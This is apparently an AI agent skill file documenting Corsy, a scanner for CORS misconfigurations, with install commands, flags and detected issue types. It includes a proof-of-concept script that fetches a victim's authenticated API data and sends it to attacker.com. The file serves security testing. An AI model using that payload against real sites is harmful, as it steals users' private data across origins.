---
name: corsy
description: "CORS misconfiguration scanner that detects exploitable cross-origin resource sharing issues. Use when testing web apps for CORS vulnerabilities that could allow cross-origin data theft."
license: MIT
compatibility: "Python 3; pip install corsy; Linux/macOS/Windows; github.com/s0md3v/Corsy"
metadata:
  author: AeonDave
  version: "1.0"
---

# Corsy

CORS misconfiguration scanner — detect exploitable cross-origin policy flaws.

## Quick Start

```bash
pip install corsy

# Single URL
corsy -u https://target.com

# With authentication
corsy -u https://target.com -H "Authorization: Bearer TOKEN"

# Bulk scan from file
corsy -i urls.txt

# Output to JSON
corsy -u https://target.com --json > cors.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL |
| `-i FILE` | Input file with URLs |
| `-H "K:V"` | Custom header |
| `-t N` | Threads |
| `-d N` | Delay between requests (ms) |
| `-q` | Quiet (no banner) |
| `--json` | JSON output |

## CORS Misconfig Types Detected

| Type | Condition |
|------|-----------|
| Reflected Origin | Any origin reflected back |
| Trusted Null | `null` origin trusted |
| Prefix Match | `eviltarget.com` accepted when `target.com` trusted |
| Suffix Match | `notatarget.com` accepted |
| Trusted Subdomain | All subdomains trusted |
| HTTP allowed | HTTP origin trusted on HTTPS endpoint |

## Common Workflows

**Scan authenticated endpoint:**
```bash
corsy -u https://api.target.com/user/profile -H "Cookie: session=abc123"
```

**Verify with PoC:**
```html
<script>
fetch('https://api.target.com/user/data', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://attacker.com?d='+btoa(d)))
</script>
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | CORS exploit PoC templates |
